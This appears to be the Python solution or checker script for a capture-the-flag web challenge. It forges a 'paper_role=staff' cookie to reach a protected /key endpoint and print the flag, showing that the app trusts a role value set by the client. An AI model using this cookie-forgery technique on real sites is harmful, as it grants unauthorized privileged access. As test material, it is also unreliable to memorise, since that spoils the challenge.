import re
from urllib.error import HTTPError
from urllib.request import Request, urlopen


def get(path, cookie=''):
    try:
        with urlopen(Request('http://app:8000' + path, headers={'Cookie': cookie}), timeout=5) as response:
            return response.status, response.read().decode(), response.headers
    except HTTPError as error:
        return error.code, error.read().decode(), error.headers


def solve():
    status, home, headers = get('/')
    assert status == 200 and 'pwnden{' not in home and 'paper_role' in home
    session = next(value.split(';')[0] for value in headers.get_all('Set-Cookie') if value.startswith('paper_sid='))
    assert get('/key', session + '; paper_role=guest')[0] == 403
    status, body, _ = get('/key', session + '; paper_role=staff')
    if status == 403:
        raise SystemExit(3)
    assert status == 200
    match = re.search(r'pwnden\{[0-9a-f]{32}\}', body)
    assert match
    assert get('/key', 'paper_role=staff')[0] == 200
    print(match[0])


if __name__ == '__main__':
    solve()
